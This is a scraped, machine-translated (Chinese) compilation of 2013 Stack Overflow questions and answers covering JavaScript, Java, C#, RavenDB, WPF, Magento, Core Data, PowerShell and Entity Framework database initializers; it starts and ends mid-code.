        if (IsCookiesEnable()) {
            var token = new Date().getTime(); //use the current timestamp as the token value
            $('#download_token_value_id').val(token);

            $.blockUI({
                message:$('#msg'),
                css: {
                    padding: 0,
                    margin: 0,
                    width: '30%',
                    top: '40%',
                    left: '35%',
                    textAlign: 'center',
                    color: '#000',
                    border: '3px solid #aaa',
                    backgroundColor: '#fff',
                    cursor: 'wait',
                }});

            fileDownloadCheckTimer = window.setInterval(function () {
            var cookieValue = $.cookie('fileDownloadToken');
            //alert(cookieValue);
                if (cookieValue != null)
                   finishDownload();
            }, 1000);
               // $('.blockOverlay').attr('title','Click to unblock').click($.unblockUI);
        }
    }

    function IsCookiesEnable() {
        var cookieEnabled = (navigator.cookieEnabled) ? true : false;

        if (typeof navigator.cookieEnabled == "undefined" && !cookieEnabled) {
            document.cookie = "testcookie";
            cookieEnabled = (document.cookie.indexOf("testcookie") != -1) ? true : false;
        }
        return (cookieEnabled);
    }

    function finishDownload() {
        window.clearInterval(fileDownloadCheckTimer);
       $.cookie('fileDownloadToken', null);
        $.unblockUI();

    } 
```

在后面的代码中：

```
context.Response.AppendCookie(new HttpCookie("fileDownloadToken", _token)); 
```

# java - 我怎样才能读取一个字符串，直到我在其中找到一个“文本”（或以某种方式使阅读速度更快）？

> ID：15998893
> 
> 赞同：0
> 
> 时间：2013-04-14T12:09:13.377
> 
> 标签：java, android, string

我在这里有一堂课，在那里我阅读网页的来源并搜索特定的值。这通常需要 1 秒才能完成，但我希望它更短。我的第一个猜测是，这个值通常在页面的一半，所以我可能只读到一半。

```
public class ReadData {
     public static void main(String[] args) throws IOException {
             StringBuilder line = new StringBuilder(1000000);

         URL url = new URL(url);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         BufferedReader rd = new BufferedReader(new InputStreamReader(conn
                 .getInputStream()));
         while (rd.readLine() != null) {
             line.append(rd.readLine());
             }

         long start = line.indexOf(startReading);
         long finish = line.indexOf(finishReading);
         String value= line.substring((int)start + 1, (int)finish);
         System.out.println("VALUE: " + value);

        }
} 
```

所以现在我阅读了整个文本，然后找到`startReading`and`finishReading`字符串，我得到了它们之间的值。`finishReading`在找到字符串之前，我如何才能阅读源代码？或者有什么方法可以加快阅读速度？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:22:04.977

您当前的版本将整个文档读入内存，然后通过搜索内存中的副本来查找您感兴趣的位。

更好的方法是一次读取文档一行，查找包含开始和结束字符串的行。只有在获得“开始”线时才开始保存，并在获得停止线时完全停止。

这是否会显着加快您的应用程序取决于当前花费的时间。如果大部分（挂钟）时间都在启动 JVM，发送请求并等待文档开始到达，这将无济于事。同样，如果“开始”和“结束”之间的文本是文档的大部分内容，也无济于事。

* * *

其他几点注意事项：

1.  您编写的程序将丢弃输入中的换行符。如果是文本，则可能导致连续的单词跨行边界连接。
2.  你最后没有关闭阅读器，你会导致资源（文件描述符）泄漏。
3.  预先分配一个巨大的 StringBuilder 可能是个坏主意……除非您对它需要多大有一个很好的估计。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:11:58.133

```
while (rd.readLine() != null) {
    String temp=rd.readLine() ;
    line.append(temp);
    if(temp.contains(finishReading))
        break;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T08:24:20.447

要实现更短的时间，您可以在文件读取期间检查/搜索文本。老实说，这取决于原始文本是否根本没有新行（如果是这种情况，性能将相同）。

但在解决这个问题之前，我相信您从 URL 中读取的方式是错误的！您在第二次调用期间添加字符串时调用了**readLine ()方法两次！**所以你在每次迭代中都跳过了一行！

它认为应该这样做：

```
public class ReadData {

    public static void main ( String [] args ) throws IOException {

        StringBuilder text = new StringBuilder ();

        URL url = new URL ( url );
        HttpURLConnection conn = (HttpURLConnection) url.openConnection ();
        BufferedReader rd = new BufferedReader ( new InputStreamReader ( conn.getInputStream () ) );

        String line = null;
        while ( ( line = rd.readLine () ) != null ) {
            text.append ( line );
            text.append ( "\n" );
        }

        rd.close ();

    }
} 
```

现在要搜索您需要的介于**startReading**和**endReading**之间的文本值，您可以这样做：

```
public static void main ( String [] args ) throws IOException {

    // Calendar object used to know when the iteration started
    Calendar start = Calendar.getInstance ();
    SimpleDateFormat displayDate = new SimpleDateFormat ( "HH:mm:ss SSS" );
    System.out.println( "Iteration started at : " + displayDate.format ( start.getTime () ) );

    String line = null;
    boolean startReadingFound = false;
    boolean endReadingFound = false;
    while ( ( line = rd.readLine () ) != null ) {
        text.append ( line );
        text.append ( "\n" );

        // Check if 'startReading' is previously found
        if ( startReadingFound == false ) {
            // Search for the 'startReading' string
            int startIndex = line.indexOf ( startReading );
            if ( startIndex != -1 ) {
                // 'startReading' found
                startReadingFound = true;
                // Search for the 'endReading' string, it may be on the same line
                int endIndex = line.indexOf ( endReading );
                if ( endIndex == -1 ) {
                    // 'endReading' not found
                    value.append ( line.substring ( startIndex + startReading.length () ) );
                    value.append ( "\n" );
                }
                else {
                    // 'endReading' found
                    endReadingFound = true;
                    value.append ( line.substring ( startIndex + startReading.length () , endIndex ) );
                    value.append ( "\n" );
                }
            }
        }
        // Check if 'endReading' is previously found
        else if ( endReadingFound == false ) {
            // Search for the 'endReading' string
            int endIndex = line.indexOf ( endReading );
            if ( endIndex == -1 ) {
                // 'endReading' not found
                value.append ( line );
                value.append ( "\n" );
            }
            else {
                // 'endReading' found
                endReadingFound = true;
                value.append ( line.substring ( 0 , endIndex ) );
                value.append ( "\n" );
            }
        }
    }

    rd.close ();

    // Calendar object used to know when the iteration ended
    Calendar end = Calendar.getInstance ();
    System.out.println( "Iteration ended at : " + displayDate.format ( end.getTime () ) );
    System.out.println( "Iteration duration : " + ( end.getTimeInMillis () - start.getTimeInMillis () ) + " milliseconds." );

} 
```

如您所见，首先您可以开始在每一行中查找**startReading**字符串。如果找到它，则开始添加（在开始阅读字符串之后）行，直到找到**endReading**字符串。

为了知道在 while 循环中花费的确切时间，我添加了我正在显示的日历对象，因此您可以知道确切的持续时间（以毫秒为单位）。

试试看，如果它解决了你的问题，请告诉我。

# c# - C#实现raven db按部分word全文搜索

> ID：15998895
> 
> 赞同：1
> 
> 时间：2013-04-14T12:09:27.753
> 
> 标签：c#, linq, full-text-search, ravendb, contains

我有一个网格，我需要支持全文搜索。我不仅需要以开头和结尾来支持搜索，而且还需要支持单词部分的搜索。例如，如果我有“MyWord”，我需要通过“wor”部分找到该搜索。如果我尝试使用 string.contains() 我会收到以下错误：

```
Contains is not supported, doing a substring match over a text field is a very slow operation, and is not allowed using the Linq API.
The recommended method is to use full text search (mark the field as Analyzed and use the Search() method to query it. 
```

如果我构建 raven db 索引并将字段标记为已分析，则包含不起作用。它适用于 StartWith() 和 EndWith()，但不适用于包含。使用 .Search() 我得到了相同的结果。另一种选择是使用 lucene 语法：

```
.Where("Name:*partOfWord*") 
```

它工作正常，但我不想将 linq 与 lucene 语法结合起来，我想使用 raven db 索引来解决它。

您对如何使用索引实现 raven db 的全文搜索有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:13:42.430

您想使用 NGram 分析器，如此[处](https://stackoverflow.com/questions/10791164/ravendb-fast-substring-search)所述。它是一个分析器，您可以通过将其 DLL 放到 Analyzers 文件夹中来将其添加到 RavenDB 服务器。

您真的不想执行任何 *substr Lucene 查询（即“以”结尾的子句），因为性能很糟糕。编码风格的不一致是一个较小的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:29:21.837

我使用这个查询来搜索人的全名，只需输入姓名的一部分。建议设置搜索字符串的最小长度。

```
.Search(x => x.Name, "word to search" + "*", escapeQueryOptions: EscapeQueryOptions.AllowPostfixWildcard) 
```

# database - 触发器和存储过程如何在 ER 图中表示？

> ID：15998899
> 
> 赞同：7
> 
> 时间：2013-04-14T12:09:54.443
> 
> 标签：database, database-design, uml, entity-relationship

在实体关系图中显示触发器和存储过程是个好主意吗？如果是，符号是什么？关于这个话题的信息似乎真的很少。此外，是否有任何 UML 图可以用来表示触发器？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:25:58.113

由于触发器基于顺序的操作，因此我使用了 UML 序列图而不是 ERD。泳道将是基表，消息将是触发器触发。对于存储过程，如果存储过程以某个表为中心，则可以采用相同的方法。如果没有，可以使用协作图。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-14T15:17:58.700

正如史蒂夫所说，您可以在动态图中表示触发器或存储过程的动态。但是对于触发器，如果​​你只是想声明它们，你也可以将它们添加为类中的操作，用于表示实体关系图中的相应表。在这种情况下，您可能希望对这些操作使用相关的构造型，例如`<<trigger>>`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-14T15:36:32.307

ER 图从未用于此目的，因此不太适合。

其他地方建议的 UML 事件序列（泳道）可能会好一点，但 imo 仍然存在问题。箭头无法区分插入和删除，因此您必须为每个表提供几个不同的图表（一个用于插入时发生的情况，一个用于删除时发生的情况，然后仍然存在更新的灰色区域）。我也不太确定泳道图表是否可以很好地记录其他（目标）表的确切情况。插入还是删除？究竟是哪一行？等等等等

# c# - C# .Net 中的正则表达式类和测试

> ID：15998902
> 
> 赞同：0
> 
> 时间：2013-04-14T12:09:56.833
> 
> 标签：c#, .net, regex

我复制了一个在 Javascript 中工作的 RegEx。但是当我在 C# 中运行它时，它返回 false。我不确定是我的代码不正确还是正则表达式。这是我的代码。

```
bool isValid = true;

string nameInput = "Andreas Johansson";
string emailInput = "email@gmail.com";
string passwordInput = "abcABC123";

string namePattern = @"^[A-z]+(-[A-z]+)*$";
string emailPattern = @"^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$";
string passwordPattern = @"^(?=.*\d+)(?=.*[a-zA-Z])[0-9a-zA-Z!@#$%]{6,50}$";
Regex nameRegEx = new Regex(namePattern);
Regex emailRegEx = new Regex(emailPattern);
Regex passwordRegEx = new Regex(passwordPattern);

if (model.CreateFullName.Length < 3 || !nameRegEx.IsMatch(nameInput))
                    isValid = false;

if (model.CreateEmail.Length < 3 || !emailRegEx.IsMatch(emailInput))
                    isValid = false;

if (model.CreatePassword.Length < 3 || !passwordRegEx.IsMatch(passwordInput))
                    isValid = false; 
```

感谢您的投入！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:12:03.873

您应该从模式定义中删除边界斜线。它们是 javascript 而不是 .NET 中的正则表达式对象所必需的。例如：

```
string namePattern = @"^[A-z]+(-[A-z]+)*$";
string emailPattern = @"^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$";
string passwordPattern = @"^(?=.*\d+)(?=.*[a-zA-Z])[0-9a-zA-Z!@#$%]{6,50}$"; 
```

更新：您在编辑中修复了它们。

名称模式仍然不考虑输入中的空格。请尝试以下操作：

```
^[A-z]+([-\s][A-z]+)*$ 
```

另请注意，这`[A-z]`不是匹配字母的正确模式。用于`[A-Za-z]`匹配 ASCII 字母，或`\p{L}`匹配任何 unicode 字母。

问题`[A-z]`在于它也匹配这些位于之后`Z`和之前的字符`a`：

```
[\]^_` 
```

# workflow-foundation-4 - 流程图总是显示所有节点都折叠了，有什么方法可以扩展它们？

> ID：15998904
> 
> 赞同：1
> 
> 时间：2013-04-14T12:09:58.787
> 
> 标签：workflow-foundation-4, activitydesigner

我们使用[流程图活动](http://msdn.microsoft.com/en-us/library/ee829567%28v=vs.100%29.aspx)作为我们工作流程的基础。我在流程图的设计器表面上放置的所有活动都显示为折叠状态。即使我点击设计器右上角的“全部展开”。

首先，我认为这是我的活动设计器代码的问题，但对于像序列这样的标准活动也是如此：在流程图中它们不能以展开模式显示。他们也没有在右上角显示常规的展开/折叠图标。

另一个序列中的一个小序列是可扩展的： ![在此处输入图像描述](https://i.stack.imgur.com/ZtLbN.png)

但在流程图内部，相同的序列不是： ![在此处输入图像描述](https://i.stack.imgur.com/f6pQl.png)

这是有意设计的，还是我只是错过了一些非常基本的部分？我想扩展个人活动（我们有很多精心设计的设计师），但目前这似乎只适用于类似序列的基本活动，而不适用于流程图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-28T21:55:06.587

我认为如果您的流程图有很多项目会很复杂，因此他们更喜欢级别，当您双击序列项目时，您可以在导航菜单中看到它，如果您有序列 WF 并且添加流程图项目将相同

# algorithm - 将 A*-Search 实现为广度优先搜索/深度优先搜索

> ID：15998905
> 
> 赞同：0
> 
> 时间：2013-04-14T12:10:04.210
> 
> 标签：algorithm, search

对于“人工智能导论”中的作业，我需要解决以下问题：

```
Let f(n) = c1*g(n) + c2*h(n) be an evaluation function, where c1,c2 be constants.
1\. Define c1,c2,h(.),g(.) such that A* with this evaluation function is bfs.
2\. Define c1,c2,h(.),g(.) such that A* with this evaluation function is dfs. 
```

对于 BFS，我有以下想法：设`g(n)`从起始节点到当前节点的成本和`h(n)`从当前节点到目标的估计成本。如果我设置`c2 = 0`它实际上应该是广度优先搜索。

对于 DFS，我想设置`c2 = 0`和`c1 = (-1)`

您可以给我任何想法、提示或反馈吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:30:28.260

我认为你的答案是预期的。但是我认为这个问题有点错误，因为我发现不可能制作 BFS 和 DFS（用我理解的术语）。

问题是 DFS 和 BFS 都不关心路径长度。他们只关心节点顺序。

您的 BFS 解决方案实际上是一个统一成本搜索（或 dijkstra 算法），它是对基本 BFS 的改进。

您的 DFS 解决方案扩展了最远的节点，这不是实际 DFS（带堆栈）的工作方式。

*如果在某处声明弧成本始终相同，则答案将是正确的。*

# javascript - 将单选按钮值传递到表单中 onClick 的 URL

> ID：15998907
> 
> 赞同：0
> 
> 时间：2013-04-14T12:10:19.410
> 
> 标签：javascript, forms, radio-button

我需要一些帮助才能使以下表单与单选按钮值一起使用。我希望用户选择一个类别（使用`select`下拉菜单），然后选择一个大小（使用单选按钮），并在单击按钮时将类别和大小的值都传递到 URL 中。所以它会带用户到`http://thewebsiteaddress.com/category/size`.

除了单选按钮值之外，我在下面的基本表单工作正常 - 单击按钮时，它在 URL 中一直显示为“未定义”。我对此很陌生，如果能帮助我走上正确的道路或向我展示执行此任务的更好方法，我将不胜感激。

感谢您在这里的任何指导。

```
<script type="text/javascript">
function combineSelections(cat,sizes){
location.href='http://thewebsiteaddress.com/product-category/'+cat.value+'/'+sizes.value;
}
</script>
<form name="searchbysize">
<select name="categories">
<option value="">Select Product Category</option>
<option value="category-slug">Category Name</option>
</select>
<input type="radio" id="very-small" name="size" value="very-small" />
<label for="very-small">Very Small </label>

<input type="radio" name="size" value="small" />
<label for="small">Small </label>

<input value="Search for Products" onclick="combineSelections(categories,size)"
type="button"></form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:20:17.007

添加`id="categories"`到选择和`id="size"`单选按钮，然后使用`document.getElementById()`获取单选按钮的值并选择。

```
function combineSelections()
{
   var size = document.getElementById('size').value;
   var category = document.getElementById('categories').value;
   location.href='http://thewebsiteaddress.com/product-category/'+category+'/'+size;
} 
```

# svn - 像 Git 的 SVN 的 Tig 一样吗？

> ID：15998908
> 
> 赞同：5
> 
> 时间：2013-04-14T12:10:27.477
> 
> 标签：svn, logging

我需要像在 Git 的 Tig 中一样浏览编辑，但使用 SVN。我基本上只需要查看补丁。我怎样才能做到这一点？任何简单的可视化工具或一些命令行选项？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:17:32.097

尝试

1.  Subversion 的`blame`（TortoiseSVN 有一个很好的图形查看器）
2.  延时[摄影视图工具](http://code.google.com/p/svn-time-lapse-view/)

# c# - 更改单元格值时如何更新 DataGrid 单元格背景

> ID：15998913
> 
> 赞同：1
> 
> 时间：2013-04-14T12:10:52.147
> 
> 标签：c#, wpf, binding

所有，我有以下 XAML 在运行时根据单元格内容是否为“帮助”来更改单元格背景颜色。

```
<UserControl.Resources>
  <local:CellColorConverter x:Key ="cellColorConverter"/>
</UserControl.Resources>

   <DataGrid x:Name="dataGrid" AlternatingRowBackground="Gainsboro" 
       AlternationCount="2" HorizontalAlignment="Stretch"
       VerticalAlignment="Stretch">
    <DataGrid.CellStyle>
       <Style TargetType="DataGridCell" >
          <Setter Property="Background">
             <Setter.Value>
                <MultiBinding Converter="{StaticResource cellColorConverter}" >
                   <MultiBinding.Bindings>
                      <Binding RelativeSource="{RelativeSource Self}"/>
                      <Binding Path="Row"/>
                   </MultiBinding.Bindings>
                </MultiBinding>
             </Setter.Value>
          </Setter>
          <Style.Triggers>
             <Trigger Property="IsSelected" Value="True">
                <Setter Property="Background" Value="#FF007ACC"/>
                <Setter Property="Foreground" Value="White"/>
             </Trigger>
          </Style.Triggers>
       </Style>
    </DataGrid.CellStyle>
</DataGrid> 
```

该类`CellColorConverter`处理“转换”/颜色更新。

```
public class CellColorConverter : IMultiValueConverter
{
    public object Convert(object[] values, Type targetType, object parameter, CultureInfo culture)
    {
        if (values[1] is DataRow)
        {
            //Change the background of any cell with 1.0 to light red.
            var cell = (DataGridCell)values[0];
            var row = (DataRow)values[1];
            var columnName = cell.Column.SortMemberPath;
            if (row[columnName].ToString().CompareTo("Help") == 0)
                return new SolidColorBrush(Colors.LightSalmon);
        }
        return SystemColors.AppWorkspaceColor;
    }

    public object[] ConvertBack(object value, Type[] targetTypes, object parameter, CultureInfo culture)
    {
     throw new System.NotImplementedException();
    }
} 
```

这在加载数据时有效，但如果用户在单元格中键入“帮助”，我也希望更新颜色。所以我尝试将绑定修改为

```
<Setter Property="Background">
    <Setter.Value>
         <MultiBinding Converter="{StaticResource cellColorConverter}" >
              <MultiBinding.Bindings>
                   <Binding RelativeSource="{RelativeSource Self}" // Changed this!
                            Mode="TwoWay" UpdateSourceTrigger="PropertyChanged"/>
                   <Binding Path="Row"/>
              </MultiBinding.Bindings>
         </MultiBinding>
     </Setter.Value> 
```

但这并没有奏效。**更改和提交单元格值时如何更改背景单元格颜色？**

谢谢你的时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T20:50:25.277

如果我可以假设您的数据网格绑定到视图模型中的项目集合，那么对于特定列，您可以使用 DataTrigger：

```
<DataGrid ItemsSource="{Binding Items}" ...>
    <DataGrid.Columns>
        ... columns
        <DataGridTextColumn Header="My column" 
            Binding="{Binding MyItem, UpdateSourceTrigger=PropertyChanged}">
            <DataGridTextColumn.CellStyle>
                <Style TargetType="{x:Type DataGridCell}">
                    <Style.Triggers>
                        <DataTrigger Binding="{Binding MyItem}" Value="Help">
                            <Setter Property="Background" Value="LightSalmon"/>
                        </DataTrigger>
                    </Style.Triggers>
                </Style>
            </DataGridTextColumn.CellStyle>
        </DataGridTextColumn> 
```

问题是如果您需要将其应用于所有列，在这种情况下，您需要为每个列使用单独的样式。

# magento - Magento产品进口对重复产品的腐败

> ID：15998917
> 
> 赞同：0
> 
> 时间：2013-04-14T12:11:11.793
> 
> 标签：magento, import, magento-1.7

以下步骤将在没有示例数据的最新 Magento 的全新安装上重现产品数据损坏：

1.  创建新产品并输入以下数据：名称、描述、简短描述、SKU、重量、状态、可见性、价格和税级
2.  保存产品
3.  编辑您刚刚创建的产品并复制它
4.  编辑重复的产品并填写缺少的SKU
5.  保存重复的产品
6.  通过系统导出所有产品数据>>导入/导出>>导出
7.  通过 System >> Import/Export >> Export 导入您刚刚导出的 CSV，然后选择“Replace Existing Complex Data”</li>

现在，当您转到“管理产品”时，您将同时看到原始产品和重复产品，但重复产品不会显示价格。如果您编辑这两个产品，您会发现原始产品完全符合其应有的状态，但除了 SKU 之外的所有字段对于重复的产品都是空的。有趣的是，重复产品的名称显示在“管理产品”列表中，而不是实际产品本身。

如何在不发生这种损坏的情况下导入这些数据？

我应该提交错误报告吗

# ios - 我可以在接口中使用 readonly 装饰核心数据属性，然后在实现中使用 readwrite 吗？

> ID：15998926
> 
> 赞同：0
> 
> 时间：2013-04-14T12:12:39.440
> 
> 标签：ios, core-data

在我的 NSManagedObject 子类中，我想在接口中将特定属性指定为只读，但在实现中指定为读写。我以前在其他课程中也这样做过。但是核心数据生成的子类在实现中使用@dynamic，似乎我无法将读写装饰器添加到@dynamic，就像可以使用@property 一样。

这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:32:53.153

您可以在头文件中将属性声明为`readonly`，然后在实现中为 setter 提供您自己的实现：

（使用 ARC）

```
@interface Person : NSManagedObject

@property (nonatomic, readonly) NSString * name;

- (void)changeName;

@end

@implementation Person

@dynamic name;

- (void)changeName
{
    self.name = @"Test";
}

- (void)setName:(NSString *)name
{
    [self willChangeValueForKey:@"name"];
    [self setPrimitiveValue:name forKey:@"name"];
    [self didChangeValueForKey:@"name"];
} 
```

# powershell - 创建自动文件移动脚本（Powershell）的困难

> ID：15998927
> 
> 赞同：0
> 
> 时间：2013-04-14T12:12:40.787
> 
> 标签：powershell, automation, backup

我将首先说明我对 Powershell 很陌生，但据我所知，它可能非常强大。

话虽如此，我会具体说明问题。

我正在尝试编写一个注定要每天运行的 Powershell 脚本并检查许多特定文件夹的总大小，在每个文件夹中都有文件夹排序，比如说名称。我的目标是最终结果是一个检查这些文件夹大小的脚本，如果它超过了我预先设置的定义限制，它们的内容将被移动到预定义的目的地。这些文件将被移动到与之前相同名称的文件夹中。

到目前为止，这是我所得到的：

```
$Folder_A = "C:\Users\location_A"
$Folder_B = "C:\Users\location_B"
$Folder_C = "C:\Users\location_C"
if((get-childitem $Folder_A , $Folder_B , $Folder_C | where {$_.name -eq name_1-or $_.name -eq $Name_2} | measure-object -property length -sum).sum -gt 30000) {write-host "success"} 
```

输出？

```
You must provide a value expression on the right-hand side of the '-eq' operator.
At line:1 char:63
+ if((get-childitem $input , $Temp , $Tiffs | where {$_.name -eq <<<<  I001 -or $_.name -eq I002} | measure-object -property length -sum).sum -gt 30000) {
write-host "success"}
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ExpectedValueExpression 
```

如果有人能够帮助这件事取得进展，我会非常感谢它！

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:20:41.803

你在 where 闭包中缺少一个空格。它应该是：

```
where {$_.name -eq name_1 -or $_.name -eq $Name_2} 
```

为确保正确使用 () ，您的声明将是：

```
 where {($_.name -eq name_1) -or ($_.name -eq $Name_2)} 
```

**更新** 我的完整（测试）脚本来计算选定目录的总和：

```
$names = @("IIS", "IIS Express")
$folders = @("C:\Program Files", "C:\Program Files (x86)")
$x = (gci $folders | where {$names -contains $_.name})
$sum = (($x | %{(Get-ChildItem $_.FullName -recurse | Measure-Object -property length -sum)}) | Measure-Object -Property 'Sum' -Sum).sum
if($sum -gt 3000){write-host "success"} 
```

在您的情况下：`$folders = @("C:\Program Files", "C:\Program Files (x86)")`替换为`$folders = @("C:\Users\location_A", "C:\Users\location_B", "C:\Users\location_C")`并在名称中放入您需要的内容

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T13:17:11.797

检查属性是否与多个引用中的任何一个匹配的规范方法是将引用字符串放入数组并检查数组是否包含属性值。您要检查的文件夹的名称也应该放入一个数组而不是单个变量中。

尝试这样的事情：

```
$src = @(
  "C:\Users\location_A",
  "C:\Users\location_B",
  "C:\Users\location_C"
)

$ref = @(
  "name_1",
  "name_2",
  ...
)

$found = [bool](Get-ChildItem $src `
  | ? { $ref -contains $_.Name } `
  | Measure-Object -property Length -sum `
  | ? { $_.sum -gt 30000 })

if ($found) { write-host "success" } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T16:02:38.530

您可以使用目录数组作为路径。如果您使用 -Recurse（即使没有要递归的任何子目录），您可以将文件名列表指定为 -Include 参数的数组参数：

```
$Folders = 'C:\Users\location_A','C:\Users\location_B','C:\Users\location_C'
$Files = 'name_1','name_2'

if ((((get-childitem $Folders -Recurse -Include $files | select -ExpandProperty length) | measure -sum).sum) -gt 30000)
  {write-host 'Success'} 
```

# c# - EF 中 IDatabaseInitializer 的正确用法是什么？

> ID：15998931
> 
> 赞同：18
> 
> 时间：2013-04-14T12:13:05.027
> 
> 标签：c#, entity-framework, ef-code-first, entity-framework-migrations, entity-framework-6

我有一个自定义的 DatabaseInitialiser，它在下面

```
/// <summary>
/// Implements the IDatabaseInitializer to provide a custom database initialisation for the context.
/// </summary>
/// <typeparam name="TContext">TContext is the DbContext</typeparam>
public class ParikshaDataBaseInitializer<TContext> : IDatabaseInitializer<TContext> where TContext : DbContext
{
    /// <summary>
    /// The method to Initialise the database.
    /// Takes care of the database cannot be dropped since it is in use problem while dropping and recreating the database.
    /// </summary>
    /// <param name="context">The DbContext on which to run the initialiser</param>
    public void InitializeDatabase(TContext context)
    {
        var exists = context.Database.Exists();

        try
        {
            if (exists && context.Database.CompatibleWithModel(true))
            {
                // everything is good , we are done
                return;
            }

            if (!exists)
            {
                context.Database.Create();
            }
        }
        catch (Exception)
        {
            //Something is wrong , either we could not locate the metadata or the model is not compatible.
            if (exists)
            {
                context.Database.ExecuteSqlCommand("ALTER DATABASE Pariksha SET SINGLE_USER WITH ROLLBACK IMMEDIATE");
                context.Database.ExecuteSqlCommand("USE Master DROP DATABASE Pariksha");
                context.SaveChanges();
            }

            context.Database.Create();
        }
    } 
} 
```

关于上述代码的一些东西不仅仅是hacky（请随时提供帮助）

然后我添加了迁移并使迁移脚本也能正常工作。

```
 internal sealed class Configuration : DbMigrationsConfiguration<ParikshaContext>
    {
        public Configuration()
        {
            AutomaticMigrationsEnabled = false;
            ContextKey = "EFRepository.Context.ParikshaContext";
        }

        protected override void Seed(ParikshaContext context)
        {
        }
    } 
```

迁移按预期工作。

现在，问题是在我的应用程序启动中我应该怎么做？像这样的东西

```
 var config = new Configuration();
 var migrator = new DbMigrator(config);
 migrator.Update(); 
```

并且一些论坛也在构造函数中提出了这一点，这似乎有点奇怪，因为我不想在每次使用上下文时检查数据库和模式是否正确。那么，这种技术的可能用途是什么，或者我认为建议的上下文是错误的？

```
public ParikshaContext() : base("Pariksha")
        {           
          Database.SetInitializer(new ParikshaDataBaseInitializer<ParikshaContext>());
        } 
```

总结一下，

1.  可用的不同技术的正确用例是什么？

2.  什么是理想的策略，以便迁移在所有条件下以及当我们将数据库从一个环境移动到另一个环境时工作？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-21T23:47:31.203

这是我尝试`Db Initializer`将`Migration`初始化程序和默认程序`Db Create`与播种结合起来的尝试。（注意：这并不理想，更像是一个简单的练习，但可以解决您在此处提出的问题，大多数情况下都有效 - 只需检查我所做的所有更新）。

> [如何创建初始化程序来创建和迁移 mysql 数据库？](https://stackoverflow.com/questions/15796115/how-to-create-initializer-to-create-and-migrate-mysql-database/15796416#15796416)

至于`why`and `how`- 为了完全理解，我建议您也参考[EF 源代码](http://entityframework.codeplex.com/)（这是新版本，但在许多方面相似）

### 1)

**a) Db 初始化程序通常只被调用一次**（每个连接） - 当你第一次尝试访问你的“模型”时（第一次查询或类似的）。在初始化程序中放置一个断点以进行检查。

因此，将它放在构造函数中是完全安全的（尽管我更喜欢在某个地方启动它，也可以配置）。**它仅在需要初始化**（并且`last one set`已使用）时才被调用，您不应手动调用它。

无论如何，要强制初始化器，您可以执行`this.Database.Initialize(force: true);`

> 对于切换连接时，请参阅我关于问题的帖子
> [Code first custom connection string and migrations without using IDbContextFactory](https://stackoverflow.com/questions/15926897/code-first-custom-connection-string-and-migrations-without-using-idbcontextfacto/15938194#15938194)

**b）**如果您创建自己的`IDatabaseInitializer`并且仍然希望迁移工作`side by side`

**您不应该只`DbMigrator`从外部**调用- 因为您的自定义初始化程序将错过整个“数据库创建”（例如，如果您希望播种或其他内容 - 请查看我上面的示例）。

**这两件事实际上都是“初始化程序” - 所以你需要将它们集成到一个**中，这`chain`在某种程度上就是这样。请记住这`order of execution`很重要（请参阅上面的问题示例）-您应该检查“空条件”，然后调用`DbMigrator`，然后进行自己的初始化。我使用了一个初始化器作为基类，并合并了另一个。

如果你只是想`seed`- 你可以使用迁移配置，这是最简单的，如果合理的话。

### 2)

非常“开放式”，没有单一的答案。通常它可以工作，但问题是expexted ...

*   迁移是三件事（如我所见） - 您的代码模型/实体、数据库/表和`__MigrationHistory`Db 中的系统表。所有 3 需要留下来`in sync`。如果您“不同步”，您可以删除迁移表，重新创建迁移（使用保留现有数据库的标志），然后像以前一样继续 - 即有针对何时使用实时数据的解决方案。为此，请参阅[如何在 EF 4.3 迁移中忽略表/类](https://stackoverflow.com/questions/9016709/how-to-ignore-a-table-class-in-ef-4-3-migrations/9623319#9623319)，

*   移动数据库时，您需要删除/创建 Db 的权限，

*   确保您的连接正确（更改配置 - 并与您的 DbContext 名称或 ctor 同步），

*   保持简单，不要做花哨的事情或从代码切换连接（可能但有问题）等，

*   不要`mix database / code`版本 - 即一个代码实体版本 - 一个数据库。如果您想与不同的代码版本（例如暂存、生产）共享同一个 Db - 不要（EF6 中将提供多租户解决方案 - 例如[这个](https://stackoverflow.com/questions/15955145/entity-framework-with-multiple-models-throws-error-stating-the-model-backing-th/15956419#15956419)），

*   如果您需要手动应用数据库 - 生成`script`通过`Update-Database`- 并应用它，请不要手动执行操作，否则您会弄错（迁移历史表） - 请参阅[这个](https://stackoverflow.com/questions/10254613/mvc3-and-code-first-migrations/10255051#10255051)，

……仅举几例。它非常稳定且可用 IMO - 但如果您遵守规则 - 并知道限制是什么。

* * *

```
class CreateAndMigrateDatabaseInitializer<TContext, TConfiguration> 
    : CreateDatabaseIfNotExists<TContext>, IDatabaseInitializer<TContext>
    where TContext : DbContext
    where TConfiguration : DbMigrationsConfiguration<TContext>, new()
{
    private readonly DbMigrationsConfiguration _configuration;
    public CreateAndMigrateDatabaseInitializer()
    {
        _configuration = new TConfiguration();
    }
